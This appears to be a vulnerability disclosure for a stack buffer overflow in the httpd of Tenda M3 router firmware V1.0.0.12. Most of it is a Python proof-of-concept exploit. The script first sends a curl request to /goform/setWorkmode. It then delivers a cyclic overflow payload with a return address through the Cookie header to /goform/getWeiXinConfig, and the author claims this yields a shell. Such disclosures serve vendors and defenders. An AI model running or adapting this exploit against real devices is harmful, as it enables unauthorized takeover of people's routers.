# Tenda M3 Stack Overflow

**Vender** ：Tenda

**Firmware version**:V1.0.0.12(4856)

**Exploit Author**: GD@hillstone

**Vendor Homepage**: https://www.tenda.com.cn/



## POC

httpd in directory `/bin` has a stack overflow vulnerability. The vulnerability occurrs in the `formGetWeiXinConfig` function, which can be accessed via the url  `/goform/getWeiXinConfig`.

![1](./1.jpg)



When we send packets, the router will be shell

```
#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import  requests
from pwn import *
import os
 

if __name__ == '__main__':
    #Fireitup
    #payload='a'*29+'\xfc\x69\x04\x01'
    #payload=payload.ljust(900,'a')
    payload='bbbbbbbb='+cyclic(0x58)+'\xfc\x69\x04\x00'
    url = 'http://192.168.10.1/goform/getWeiXinConfig'
    # 构造http数据包

    header = {
        'Cookie'        : 'bLanguage=cn; user=admin; workMode=devUid'+payload,
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type'  : 'application/x-www-form-urlencoded',
        'User-Agent'    : 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'
        }
    # 发起http请求
    try:
	cmd='''curl -i -X POST http://192.168.10.1/goform/setWorkmode -d acAddr='bbbb' -d workmode='master' -d  devname='aaa'  --cookie "user=admin"'''
	os.system(cmd)
        a=requests.get(url,headers=header)
        #print a.text
        print '[+] execute ok'
    except Exception,e:
        print "2Payload delivery failed: %s" % str(e)

```





![poc](./poc.jpg)



